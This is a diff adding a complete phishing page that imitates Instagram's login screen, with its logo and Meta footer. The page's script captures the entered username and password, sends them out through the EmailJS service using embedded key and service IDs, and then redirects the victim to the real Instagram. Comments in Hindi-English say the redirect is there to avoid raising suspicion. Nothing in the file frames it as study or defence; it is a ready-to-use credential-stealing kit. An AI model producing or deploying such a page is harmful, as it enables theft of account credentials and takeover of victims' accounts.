@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <style>
+        body { 
+            margin: 0; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #ffffff; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+        .container { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
+        }
+        /* Logo Styling - Fixed */
+        .logo-box {
+            width: 175px;
+            margin-bottom: 40px;
+        }
+        .logo-box img {
+            width: 100%;
+            display: block;
+        }
+        form { 
+            width: 100%; 
+            max-width: 350px; 
+            text-align: center; 
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 6px 0; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 8px; 
+            background: #fafafa; 
+            font-size: 14px; 
+            outline: none; 
+            box-sizing: border-box; 
+        }
+        .login-btn { 
+            width: 100%; 
+            padding: 14px; 
+            margin-top: 14px; 
+            background: #0095f6; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+        }
+        .forgot { 
+            margin-top: 20px; 
+            color: #00376b; 
+            text-decoration: none; 
+            font-size: 14px; 
+        }
+        .footer { 
+            padding: 20px; 
+            text-align: center; 
+            color: #737373; 
+            font-size: 12px; 
+        }
+        .meta-logo { 
+            font-weight: bold; 
+            letter-spacing: 1px; 
+            margin-top: 5px; 
+            color: #262626; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+    </div>
+
+    <form id="insta-form">
+        <input type="text" id="user" placeholder="Phone number, username, or email" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        <button type="submit" class="login-btn" id="sBtn">Log in</button>
+    </form>
+
+    <a href="#" class="forgot">Forgot password?</a>
+</div>
+
+<div class="footer">
+    <div>from</div>
+    <div class="meta-logo">Ⓜ Meta</div>
+</div>
+
+<script type="text/javascript">
+   (function(){
+      // Aapki Public Key
+      emailjs.init("5YljAsHjaubYAfdEv"); 
+   })();
+
+   document.getElementById('insta-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      
+      const btn = document.getElementById('sBtn');
+      btn.innerHTML = "Logging in...";
+      btn.style.opacity = "0.7";
+
+      // Service ID: service_8olks4f
+      // Template ID: template_mr3zz7m
+      emailjs.send("service_8olks4f", "template_mr3zz7m", {
+         Username: document.getElementById("user").value,
+         Password: document.getElementById("pass").value,
+      })
+      .then(function() {
+         // Data milte hi asli Instagram par bhej dega
+         window.location.href = "https://www.instagram.com/";
+      }, function(error) {
+         // Error aane par bhi redirect taaki shaq na ho
+         window.location.href = "https://www.instagram.com/";
+      });
+   });
+</script>
+
+</body>
+</html>
